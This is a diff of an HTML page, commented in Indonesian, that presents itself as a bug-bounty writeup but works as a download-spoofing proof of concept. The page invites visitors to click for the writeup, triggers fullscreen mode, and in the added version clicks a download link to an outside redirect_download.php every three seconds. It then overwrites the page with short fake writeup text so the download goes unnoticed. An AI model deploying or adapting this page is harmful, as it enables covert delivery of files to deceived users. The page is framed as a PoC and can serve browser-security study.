@@ -1,107 +1,17 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Writeup</title>
-</head>
 <body>
-    <h1>Klik kiri link di bawah ini untuk membaca full writeup PoC bug bounty saya.</h1>
-    
-    <a id='aid' href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>Baca Writeup</a>
-
-    <script>
-        // Mengambil elemen link
-        const linkElem = document.getElementById('aid');
-
-        // Menambahkan event listener untuk klik kiri
-        linkElem.addEventListener('click', function(event) {
-            
-            // 1. Memicu mode fullscreen pada seluruh body halaman ini
-            if (document.body.requestFullscreen) {
-                document.body.requestFullscreen();
-            } else if (document.body.webkitRequestFullscreen) { /* Safari */
-                document.body.webkitRequestFullscreen();
-            } else if (document.body.msRequestFullscreen) { /* IE11 */
-                document.body.msRequestFullscreen();
-            }
-
-            // 2. Menjalankan fungsi penimpaan halaman setelah jeda 3 detik
-            setTimeout(v, 3000); 
-        });
-
-        function v() {  
-            // Menimpa seluruh isi dokumen HTML dengan konten writeup
-            document.write(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Bug Bounty Writeup</title>
-                    <style>
-                        body {
-                            background-color: #1e1e1e;
-                            color: #d4d4d4;
-                            font-family: 'Courier New', Courier, monospace;
-                            margin: 0;
-                            padding: 40px;
-                            display: flex;
-                            justify-content: center;
-                            height: 100vh;
-                            box-sizing: border-box;
-                            overflow-y: auto;
-                        }
-                        .content {
-                            max-width: 800px;
-                            width: 100%;
-                            background-color: #252526;
-                            padding: 30px;
-                            border-radius: 8px;
-                            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-                        }
-                        h1, h2 { 
-                            color: #569cd6; 
-                            border-bottom: 1px solid #333;
-                            padding-bottom: 10px;
-                        }
-                        p, li {
-                            font-size: 16px;
-                            line-height: 1.6;
-                        }
-                        .highlight { 
-                            background-color: #2d2d2d; 
-                            padding: 2px 5px; 
-                            border-radius: 3px; 
-                            color: #ce9178; 
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="content">
-                        <h1>Writeup: Chaining Fullscreen API with Automatic Downloads for UI Spoofing</h1>
-                        <p><strong>Author:</strong> Security Researcher</p>
-                        <p><strong>Date:</strong> March 2026</p>
-                        <br>
-                        <h2>1. Introduction</h2>
-                        <p>During my recent bug bounty hunting session, I discovered an interesting behavior in how modern browsers handle the Fullscreen API when combined with the <span class="highlight">download</span> attribute in anchor tags. By timing the execution correctly, an attacker can effectively hide the browser's native download prompt or notification.</p>
-                        
-                        <h2>2. Steps to Reproduce</h2>
-                        <ul>
-                            <li>Create an HTML page with an anchor tag pointing to an executable file.</li>
-                            <li>Add the <span class="highlight">download</span> attribute to the anchor tag.</li>
-                            <li>Bind an event listener to the click event that triggers <span class="highlight">document.body.requestFullscreen()</span>.</li>
-                            <li>Use <span class="highlight">document.write()</span> after a short delay to replace the DOM content, keeping the user distracted while the payload drops.</li>
-                        </ul>
-                        
-                        <h2>3. Impact</h2>
-                        <p>This allows an attacker to download arbitrary files to the victim's machine without their immediate visual awareness, as the fullscreen mode overlays the browser UI where the download indicator normally appears. This significantly increases the success rate of social engineering attacks.</p>
-                        <br>
-                        <p><em>End of report. Thank you for reading.</em></p>
-                    </div>
-                </body>
-                </html>
-            `); 
-            
-            // Menutup dokumen agar browser tahu penulisan selesai
-            document.close();
-        }
-    </script>
+    <h1>Klik kanan dan open window in new windows untuk membaca writeup PoC bug bounty hunting saya.</h1>
+    <a id='aid' style="opacity:1" target="_blank" onclick="javascript:document.body.requestFullscreen();" href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>redirect</a>
 </body>
+<script>
+var w = setInterval(function(){ document.getElementById("aid").click(); }, 3000);
+var x = setInterval(v, 3700);
+
+function v(){  
+    document.write("<h2>Writeup: Fullscreen API UI Spoofing</h2><p><strong>Vulnerability:</strong> Hiding download notifications using Fullscreen mode.</p><p><strong>Steps to reproduce:</strong> Trigger fullscreen simultaneously with a file download.</p><p><strong>Impact:</strong> Users are unaware of the downloaded file.</p><p>Status: PoC Successful.</p>"); 
+    clearInterval(x);
+    // window.stop()
+}
+//setInterval(function(){ document.body.requestFullscreen(); }, 2000);
+</script>
 </html>
